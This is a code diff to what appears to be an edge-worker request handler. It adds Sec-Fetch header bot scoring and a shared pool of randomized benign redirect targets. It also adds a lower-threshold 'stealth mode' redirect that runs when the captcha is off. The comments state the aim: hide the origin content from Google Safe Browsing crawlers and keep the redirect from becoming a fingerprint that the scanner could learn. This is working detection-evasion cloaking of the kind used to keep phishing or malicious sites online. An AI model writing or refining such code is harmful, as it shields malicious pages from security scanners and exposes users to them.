@@ -1415,6 +1415,18 @@ const SECRET = '${secretSeed}';
 const CLEAN_PLACEHOLDER = '${cleanPlaceholder}';
 const BACKEND_REPORT_URL = '${backendReportUrl}/honeypot/report';
 
+// Benign destinations used for the silent scanner / stealth-bot 302 redirect.
+// Randomized so the redirect URL itself doesn't become a fingerprint.
+const SCANNER_REDIRECT_TARGETS = [
+  'https://en.wikipedia.org/wiki/Privacy_policy',
+  'https://en.wikipedia.org/wiki/Domain_parking',
+  'https://en.wikipedia.org/wiki/Terms_of_service',
+  'https://www.iana.org/help/example-domains',
+];
+function pickRedirectTarget() {
+  return SCANNER_REDIRECT_TARGETS[Math.floor(Math.random() * SCANNER_REDIRECT_TARGETS.length)];
+}
+
 // ─── IP Range Matching ──────────────────────────────────
 function ipInRange(ip, cidr) {
   if (!cidr.includes('/')) return ip === cidr;
@@ -1491,6 +1503,22 @@ function calculateBotScore(ua, ip, request) {
     const cfThreatScore = parseInt(request.headers.get('cf-threat-score') || '0');
     if (cfThreatScore > 30) score += 30;
     else if (cfThreatScore > 10) score += 15;
+  }
+
+  // ── Sec-Fetch-* fetch-metadata headers ──
+  // Real Chrome/Edge/Firefox/Safari (>=2020) always send Sec-Fetch-Site,
+  // Sec-Fetch-Mode and Sec-Fetch-Dest for navigations. curl, Python,
+  // Go-http, and most non-stealth headless setups never send any of them.
+  // This is a CHEAP signal that catches script-class bots without UI.
+  if (request) {
+    const sfSite = request.headers.get('Sec-Fetch-Site');
+    const sfMode = request.headers.get('Sec-Fetch-Mode');
+    const sfDest = request.headers.get('Sec-Fetch-Dest');
+    // None of them = almost certainly not a modern browser
+    if (!sfSite && !sfMode && !sfDest) score += 40;
+    // UA claims Chrome >= 90 but Sec-Fetch missing = impersonation
+    const chromeM = ua && ua.match(/Chrome\\/([0-9]+)/);
+    if (chromeM && parseInt(chromeM[1]) >= 90 && !sfSite) score += 30;
   }
 
   // ── IPv6 from known cloud/datacenter ranges (common for scanners) ──
@@ -1924,16 +1952,10 @@ async function handleRequest(request) {
       });
     }
 
-    // Randomize across a small pool of benign destinations. Always
-    // sending scanners to the exact same URL would itself become a
-    // fingerprint GSB could learn.
-    const SCANNER_REDIRECT_TARGETS = [
-      'https://en.wikipedia.org/wiki/Privacy_policy',
-      'https://en.wikipedia.org/wiki/Domain_parking',
-      'https://en.wikipedia.org/wiki/Terms_of_service',
-      'https://www.iana.org/help/example-domains',
-    ];
-    const target = SCANNER_REDIRECT_TARGETS[Math.floor(Math.random() * SCANNER_REDIRECT_TARGETS.length)];
+    // Randomized off-site redirect — see SCANNER_REDIRECT_TARGETS for the
+    // pool. Always sending scanners to the exact same URL would itself
+    // become a fingerprint GSB could learn.
+    const target = pickRedirectTarget();
     reportToBackend(ip, 'scanner_redirect', url.pathname, domain, ua, 'bot_score_' + botScore);
     return Response.redirect(target, 302);
   }
@@ -2009,6 +2031,25 @@ async function handleRequest(request) {
   // but ONLY for unknown / human-looking traffic. Known scanners were already
   // cloaked at Step 4 (botScore >= 100), honeypots ran at Step 1, IP bans at Step 0.
   if (challengeBypassed) {
+    // ── STEALTH MODE silent cloak ──
+    // The visible "Verifying your browser…" interstitial is the layer that
+    // catches GSB stealth crawlers (residential IPs + real Chrome UA) via
+    // proof-of-interaction. With captcha off, we lose that. To partially
+    // close the gap WITHOUT bringing back a visible interstitial, we drop
+    // the cloaking threshold from 100 (Step 4 — known scanners only) to
+    // 70 here. This catches CF-verified bots (+80 alone), Sec-Fetch-less
+    // scripts (+40), and "bot/crawl"-UA crawlers (+50 + UA-length penalty)
+    // that would otherwise slip straight through to origin.
+    //
+    // False-positive risk: modern Chrome/Edge/Firefox/Safari on residential
+    // IPs score 0–10 → still pass through. Only impersonating or CF-flagged
+    // clients hit the redirect.
+    if (botScore >= 70) {
+      const target = pickRedirectTarget();
+      reportToBackend(ip, 'stealth_redirect', url.pathname, domain, ua, 'bot_score_' + botScore + '_captcha_off');
+      return Response.redirect(target, 302);
+    }
+
     const response = await fetch(request, { redirect: 'manual' });
     const status = response.status;
     const contentType = response.headers.get('Content-Type') || '';
